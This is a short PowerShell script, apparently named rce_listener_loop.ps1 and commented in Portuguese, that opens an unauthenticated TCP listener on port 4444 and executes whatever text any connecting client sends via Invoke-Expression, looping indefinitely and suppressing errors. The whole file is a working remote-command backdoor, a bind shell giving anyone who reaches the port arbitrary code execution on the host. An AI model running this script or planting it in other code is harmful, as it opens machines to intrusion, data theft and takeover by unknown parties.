# rce_listener_loop.ps1

# Cria e inicia o listener na porta 4444
$listener = [System.Net.Sockets.TcpListener]::new(4444)
$listener.Start()
Write-Host "listening on port 4444…"

while ($true) {
    try {
        # aceita nova conexão (bloqueante)
        $client = $listener.AcceptTcpClient()
        $stream = $client.GetStream()

        # lê todo o payload enviado numa só conexão
        $buffer = New-Object byte[] 4096
        $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
        if ($bytesRead -gt 0) {
            $cmd = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead).Trim()
            Write-Host "executing:" $cmd
            Invoke-Expression $cmd
        }

        # fecha conexão, mas não para o listener
        $stream.Close()
        $client.Close()
    } catch {
        # Em caso de erro, mostra e continua o loop
        Write-Host "error in connection loop:" $_.Exception.Message
    }
}
